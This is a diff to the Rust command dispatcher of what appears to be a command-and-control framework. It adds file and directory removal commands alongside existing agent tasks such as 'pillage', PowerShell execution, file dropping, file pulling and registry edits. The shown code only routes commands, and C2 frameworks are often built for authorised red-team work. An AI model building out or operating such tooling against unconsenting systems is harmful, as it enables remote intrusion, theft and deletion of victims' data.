@@ -6,10 +6,11 @@ use crate::{
     models::AppState,
     net::{Credentials, IsTaskingAgent},
     tasks::task_impl::{
-        RegOperationDelQuery, TaskDispatchError, change_directory, clear_terminal, copy_file,
-        dir_listing, file_dropper, kill_agent, kill_process, list_processes, move_file, pillage,
-        pull_file, pwd, reg_add, reg_query_del, remove_agent, run_powershell_command, set_sleep,
-        show_help, show_help_for_command, show_server_time, unknown_command,
+        FileOperationTarget, RegOperationDelQuery, TaskDispatchError, change_directory,
+        clear_terminal, copy_file, dir_listing, file_dropper, kill_agent, kill_process,
+        list_processes, move_file, pillage, pull_file, pwd, reg_add, reg_query_del, remove_agent,
+        remove_file, run_powershell_command, set_sleep, show_help, show_help_for_command,
+        show_server_time, unknown_command,
     },
 };
 
@@ -69,14 +70,16 @@ async fn dispatcher(
         ["pillage"] => pillage(creds, &agent).await,
         ["run", args @ ..] => run_powershell_command(args, creds, &agent).await,
         ["drop", args @ ..] => file_dropper(args, creds, &agent, state).await,
-        ["cp", _pat @ ..] | ["copy", _pat @ ..] => copy_file(raw_input, creds, &agent).await,
-        ["mv", _pat @ ..] | ["move", _pat @ ..] => move_file(raw_input, creds, &agent).await,
-        ["pull", _pat @ ..] => pull_file(raw_input, creds, &agent).await,
+        ["cp", _p @ ..] | ["copy", _p @ ..] => copy_file(raw_input, creds, &agent).await,
+        ["mv", _p @ ..] | ["move", _p @ ..] => move_file(raw_input, creds, &agent).await,
+        ["rm", _p @ ..] => remove_file(raw_input, FileOperationTarget::File, creds, &agent).await,
+        ["rm_d", _p @ ..] => remove_file(raw_input, FileOperationTarget::Dir, creds, &agent).await,
+        ["pull", _p @ ..] => pull_file(raw_input, creds, &agent).await,
         ["reg", "query", _pat @ ..] => {
             reg_query_del(raw_input, creds, &agent, RegOperationDelQuery::Query).await
         }
-        ["reg", "add", _pat @ ..] => reg_add(raw_input, creds, &agent).await,
-        ["reg", "del", _pat @ ..] => {
+        ["reg", "add", _p @ ..] => reg_add(raw_input, creds, &agent).await,
+        ["reg", "del", _p @ ..] => {
             reg_query_del(raw_input, creds, &agent, RegOperationDelQuery::Delete).await
         }
         _ => unknown_command(),
